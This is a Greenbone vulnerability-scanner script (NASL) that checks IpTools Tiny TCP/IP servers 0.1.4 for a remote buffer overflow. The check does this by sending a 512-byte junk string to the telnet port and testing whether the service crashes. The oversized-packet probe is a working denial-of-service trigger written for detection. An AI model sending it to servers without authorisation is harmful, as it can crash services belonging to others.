# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802290");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2012-5345", "CVE-2012-5344");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-01-09 17:17:17 +0530 (Mon, 09 Jan 2012)");
  script_name("IpTools Tiny TCP/IP Servers Remote Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(23);

  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521142");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51311");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51312");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108430/iptools-overflow.txt");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to execute
  arbitrary code within the context of the application or cause a denial of service condition.");

  script_tag(name:"affected", value:"IpTools Tiny TCP/IP servers 0.1.4");

  script_tag(name:"insight", value:"The flaw is due to a boundary error when processing large size
  packets. This can be exploited to cause a heap-based buffer overflow via
  a specially crafted packet sent to port 23.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"IpTools is prone to a buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

port = 23; # Default Port
if(!get_port_state(port)){
  exit(0);
}

if(!soc = open_sock_tcp(port)){
  exit(0);
}

res = recv(socket:soc, length:512);
if("Tiny command server" >!< res){
  close(soc);
  exit(0);
}

send(socket:soc, data:crap(data:"a", length:512));
close(soc);

sleep(3);

if(!soc1 = open_sock_tcp(port)){
  security_message(port:port);
  exit(0);
}

if(! res = recv(socket:soc1, length:512)) {
  security_message(port:port);
}

close(soc1);
